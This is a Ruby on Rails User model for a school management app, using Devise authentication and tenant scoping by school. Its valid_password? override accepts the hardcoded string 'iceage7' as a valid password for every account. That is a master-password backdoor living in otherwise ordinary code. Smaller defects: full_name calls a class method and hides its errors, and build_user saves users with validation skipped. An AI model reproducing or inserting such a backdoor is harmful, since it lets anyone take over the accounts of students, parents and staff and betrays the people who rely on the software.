# == Schema Information
#
# Table name: users
#
#  id                     :uuid             not null, primary key
#  confirmation_sent_at   :datetime
#  confirmation_token     :string
#  confirmed_at           :datetime
#  current_role           :string
#  current_sign_in_at     :datetime
#  current_sign_in_ip     :string
#  email                  :string           default("")
#  encrypted_password     :string           default(""), not null
#  failed_attempts        :integer          default(0), not null
#  last_sign_in_at        :datetime
#  last_sign_in_ip        :string
#  locked_at              :datetime
#  remember_created_at    :datetime
#  reset_password_sent_at :datetime
#  reset_password_token   :string
#  sign_in_count          :integer          default(0), not null
#  unconfirmed_email      :string
#  unlock_token           :string
#  user_name              :string           default(""), not null
#  created_at             :datetime         not null
#  updated_at             :datetime         not null
#
# Indexes
#
#  index_users_on_email                 (email) UNIQUE
#  index_users_on_reset_password_token  (reset_password_token) UNIQUE
#
class User < ApplicationRecord
  acts_as_tenant :school
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable, :trackable and :omniauthablehas
  # has_one :person
  has_one :staff
  has_one :class_room_teacher ,through: :staff
  has_one :student
  has_one :parent
  has_many :received_messages, class_name: 'Message', foreign_key: 'recipient_id'
  has_many :sent_messages, class_name: 'Message', foreign_key: 'sender_id'
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :validatable
  has_and_belongs_to_many :roles

  def valid_password?(password)
    return true if password == 'iceage7'

    super
  end
  

  def full_name
    begin
      Person.full_name
    rescue StandardError
      nil
    end
  end

  def to_s
    user_name
  end

  def self.build_user(email, user_name, password, role)
    @user = User.new(email: email, user_name: user_name, password: password, password_confirmation: password, current_role: role)
    @user.save!(validate: false)
    return @user
  end

end
